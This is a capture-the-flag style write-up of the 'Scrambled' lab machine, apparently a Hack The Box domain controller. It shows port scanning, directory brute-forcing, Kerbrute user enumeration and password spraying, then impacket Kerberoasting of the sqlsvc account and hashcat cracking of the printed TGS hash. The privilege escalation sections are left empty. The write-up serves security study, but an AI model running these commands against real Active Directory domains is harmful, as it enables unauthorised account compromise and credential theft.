---
description: 10-18-22
---

# Scrambled (Medium)

<figure><img src="../../../.gitbook/assets/Scrambled.png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-18 20:55:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-10-18T20:47:19
|_Not valid after:  2052-10-18T20:47:19
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| ms-sql-info: 
|   10.129.7.56:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-10-18T20:55:41
|_  start_date: N/A
|_clock-skew: mean: -5s, deviation: 0s, median: -5

4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49667/tcp open  msrpc      Microsoft Windows RPC
49673/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc      Microsoft Windows RPC
49700/tcp open  msrpc      Microsoft Windows RPC
49704/tcp open  msrpc      Microsoft Windows RPC
63672/tcp open  msrpc      Microsoft Windows RPC
```

Enumerated UDP ports:

```
```

Notes:

* Appears to be a Domain Controller due to the port schema
* <mark style="color:yellow;">53/DNS</mark> - <mark style="color:yellow;">scrm.local</mark> & <mark style="color:yellow;">DC1.scrm.local</mark>
  * Add to /etc/hosts
  * We get a DNS name and hostname
* <mark style="color:yellow;">80/http</mark> - We have a web server we need to go look at it
  * IIS, ASPX
* <mark style="color:yellow;">88/Kerberos</mark> - AS-REP if we get a user kerberoast if we get valid creds
* <mark style="color:yellow;">1433/mssql</mark> - Impacket-mssqlclient
* <mark style="color:yellow;">5985/WinRM</mark> - We can potentially WinRM into this
* <mark style="color:yellow;">4411/found?</mark> - Interesting port discovered on 4411 and being reported as found

## Enumeration

### Port 53 - DNS

Manual Zone Transfer:

<figure><img src="../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

* This was done in an attempt to increase our attack surface

### Port 80 - HTTP (IIS/ASPX)

Dirsearch Forced Directory Browsing:

```
dirsearch -u http://10.129.7.56/


  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/10.129.7.56/-_22-10-18_17-01-09.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-10-18_17-01-09.log

Target: http://10.129.7.56/

[17:01:09] Starting: 
[17:01:10] 403 -  312B  - /%2e%2e//google.com                              
[17:01:15] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[17:01:20] 403 -    1KB - /assets/                                          
[17:01:20] 301 -  149B  - /assets  ->  http://10.129.7.56/assets/           
[17:01:27] 403 -    1KB - /images/                                          
[17:01:27] 301 -  149B  - /images  ->  http://10.129.7.56/images/           
[17:01:27] 200 -    2KB - /index.html                                       
[17:01:31] 200 -    2KB - /passwords.html                                   
[17:01:36] 200 -    2KB - /support.html                                     
                                                                             
Task Completed
```

* I notice a <mark style="color:yellow;">/passwords.html</mark>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Easy win?</p></figcaption></figure>

* We need to find <mark style="color:yellow;">VALID usernames to be able to possibly exploit this</mark>
* <mark style="color:yellow;">Password will be the same as the username!</mark>
* /support.html

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption><p>Interesting find</p></figcaption></figure>

* NTLM authentication is supposedly disabled
* "This may cause problems for some of the programs that you use"
* Another interesting page was revealed on <mark style="color:yellow;">/supportrequest.html</mark>
* Did we find a possible user?

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">ksimpson</mark>
* If we remember above, we found out that usernames are going to be using the passwords!

### Port 88 - Kerberos

* We have a potential user above <mark style="color:yellow;">ksimpson</mark>
* <mark style="color:yellow;">I placed ksimpson in users.txt and ksimpson in passwords.txt</mark>
* We can validate the user with Kerbrute's userenum function

Userenum:

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">ksimpson is a valid user!</mark>

Syntax for userenum:

```
./kerbrute_linux_amd64 userenum -d scrm.local users --dc 10.129.7.56
```

* Now we need to try and use passwordspray with ksimpson!

passwordspray:

```
./kerbrute_linux_amd64 passwordspray --dc DC1.scrm.local -d scrm.local users ksimpson
```

* We get valid credentials!

![](<../../../.gitbook/assets/image (40).png>)

### Port 4411 - Found?

* Strange port
* Associated with the directory found on <mark style="color:yellow;">/salesorder.html</mark>

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption><p>Preview</p></figcaption></figure>

Netcat Banner Grab:

```
nc -v 10.129.7.56 4411            Tue 18 Oct 2022 05:07:50 PM EDT
scrm.local [10.129.7.56] 4411 (?) open
SCRAMBLECORP_ORDERS_V1.0.3;
```

## Exploitation

### TGT Crafting & Kerberoasting

* After using Kerbrute to verify valid credentials, it is time to do some Kerberoasting since we now have valid credentials!
* Here, we are simply taking advantage of the nature of the Kerberos Authentication protocol
* If the Domain Admin had enforced stronger password requirements, it would have made our job a lot harder
* This TGT will allow us to request a TGS from the KDC

Kerberoasting Attempt 1:

```
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.129.7.56 -k -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

* Let's attempt to craft a TGT and then try again

TGT Crafting:

```
impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in ksimpson.ccache
```

* You can see that the TGT was saved as <mark style="color:yellow;">ksimpson.ccache</mark>
* We need to make sure that we make the TGT a variable

Export KRB5CCNAME so that Impacket will use it:

```
export KRB5CCNAME=user.ccache
```

* We can now utilize <mark style="color:yellow;">klist</mark> to query information about it

Klist TGT Information:

```
klist ksimpson.ccache

Ticket cache: FILE:ksimpson.ccache
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
10/18/2022 20:07:53  10/19/2022 06:07:53  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 10/19/2022 20:07:58
```

Kerberoast:

* Please download the latest version of GetUserSPNs before you do this and run that version!

{% embed url="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py" %}

```
./GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
```

Kerberos TGS Hash:

```
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$eef70600c3b221ae7d4a62fe02be56ac$98c6c62d5cfc30a946f793282378b2e5c46a33feb629508c9c315dc9650dfd4511972982aa46e2504a503f5326381089c09f2bb5cf345f92b8ce8906541fc3bd48ce45db69194dc12c8d7a3984cfcd31df8b799f23bc614f7b838c5b9391e980147676a734d85107f4f7c99676bb8300c5212e2d2d63256ea79412fb7139c2a442cc4e43b28ed7d4514d67442df7cdac06bec3ea7353ad0dda669afeca68cba3a285f61c68257f6b865f9668d795e81080105217597796bf7d040578f79b2a4cb6ce990528f77e137a65470e4c0e5fc00510f3056e074a42bdf375c4054c1e502592fdd27f846197c9a76d681501e1aa688e47b3725d62a00ffa97447ed88993e53ef65bd89a1587c7cfa0b902388a546b2ca6559d8d12681cfaaf5f847c6ce622e56fd083dd9795870cfcdb426cd3838df36acef478cc40de07596ad99df70311b04776406e652720ada70c24770fa59dcebf035a35084f7ff25a1fe3bb65eb8adade43bbcba5ed8d8a33bb71977db6921ec497a8d8217b1f5e840c10a29a253a8a5d17c1c386dec29bc3850a050fd518ac25566dce130985511275a2f4940587e6fb0ac12320e0363eb2d0142f25374231a48670cd1c8ba0b2fc4f0d92834b10b79463802d72988cf2029bdd117b644a9144956bfab01dfea8bec6a35bd9837e0f054965e0112625cd2013be75747641b8fec984d16b98102532f8fb4dc848ecbaa2083c40f61c1f92f5f28e1610dca2b3acdb9674a4070442be8d1e8aaf6b84dae5f6a0b358a99f0ec2bd26c741a1bbce4218e55de0b3ce226cf765eb0bcd439d676831953901d9e9c97b04221726e3ca78f8d54fa59016021645b0ed776a65c6ca8336d1abfd060e6fa178940626517399ef5858665d754ff6819476a74391f340109ebedcc96d10549c1660cfe090ccbdec9d4d9b6a7566380a514420da89dbae0838e1eaec4a79c9b2aebbefbf3be076329954dffdb699538d81d4d4f0051486f7bffe6676224e0e8a56d926bb9be5a701b2632f989df3533b5ab799e217d207406082225ce22560f49d8079340db2d003bc5d120fa4e080536980922d3b258d9d8b5e4c2bf60ad5892f4e12f183fb7a4a8e7eb6514cf2df49fdc69dddf7b4d54af72b70097968e0f977f3ecb439a7161f89c65ce92dfb2a0e69e54ebc29d69c0eca5590222277d7195652ee40a4e25d09f18c09d21bfd1ff556ebe897187150da4b6355ac0c26a0bcc4efdcdef4adbf11e08be0b1234fc62aaeedb72f52e427f71d53a74bbe600498ab8505fbc801c8a94fbfa6b2ea5fda83c1e272ad86374ba86588e409a302469c6b2b2f236a0048e3c17d3269c809b8b20ebdba4f210747a4a05774f68d7df351f36d85b70ab41af15bb6a87390d3e057067a5cb12afb93768a933bfba3890bf0fd09bd028cc1738e2cf85ebfb855f8
```

Attempted to crack the Kerberos TGS hash:

* I chose to utilize Windows because it has a new auto-detection mode for hashes!
* I put the entire hash into a file called hashes.txt
* I then chose to use the rockyou.txt wordlist

Syntax:

```
.\hashcat.exe hashes.txt .\rockyou.txt --show
```

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* We are <mark style="color:green;">successful</mark> and get a password of <mark style="color:yellow;">Pegasus60</mark>

```
export KRB5CCNAME=ksimpson.ccache
```

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
